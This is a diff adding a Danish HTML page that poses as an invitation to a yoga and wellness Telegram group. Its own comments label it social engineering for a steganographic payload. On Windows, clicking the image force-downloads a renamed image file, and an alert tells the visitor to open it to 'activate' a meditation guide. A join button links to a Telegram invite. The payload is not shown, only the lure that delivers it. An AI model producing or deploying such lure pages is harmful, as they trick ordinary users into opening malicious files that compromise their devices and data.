@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yoga og holistisk wellness - Telegram invitation</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            overflow: hidden;
+        }
+        .header {
+            background: #0088cc;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .content {
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .wellness-img {
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .join-btn {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🧘‍♀️ Yoga og holistisk wellness</h1>
+            <p>Du er inviteret til vores eksklusive Telegram community</p>
+        </div>
+        <div class="content">
+            <p>Velkommen til Danmarks førende wellness community med over 1.200 medlemmer!</p>
+            
+            <!-- Steganographic wellness image -->
+            <img src="wellness_community.png" alt="Wellness Community" class="wellness-img" onclick="activateWellness()">
+            
+            <p><strong>200+ medlemmer online nu</strong></p>
+            <p>Klik på billedet for at aktivere din wellness-oplevelse og få adgang til:</p>
+            <ul style="text-align: left;">
+                <li>Daily meditation guides</li>
+                <li>Organic supplement tips</li>
+                <li>Holistic health coaching</li>
+                <li>Premium wellness content</li>
+            </ul>
+            
+            <button class="join-btn" onclick="joinGroup()">🔗 Join Telegram Group</button>
+        </div>
+    </div>
+
+    <script>
+        function activateWellness() {
+            // Social engineering - "activate wellness experience"
+            if (navigator.userAgent.includes('Windows')) {
+                // Trigger steganographic payload extraction (requires user to download image)
+                var link = document.createElement('a');
+                link.href = 'wellness_community.png';
+                link.download = 'wellness_guide.png';
+                link.click();
+                
+                setTimeout(() => {
+                    alert('🧘‍♀️ Wellness guide downloaded! Åbn billedet for at aktivere din personlige meditation guide.');
+                }, 1000);
+            }
+        }
+        
+        function joinGroup() {
+            // Redirect to Telegram
+            window.open('https://t.me/+YxJbAUDzpzEAAQAAAG82W3tzhTzY', '_blank');
+        }
+    </script>
+</body>
+</html>
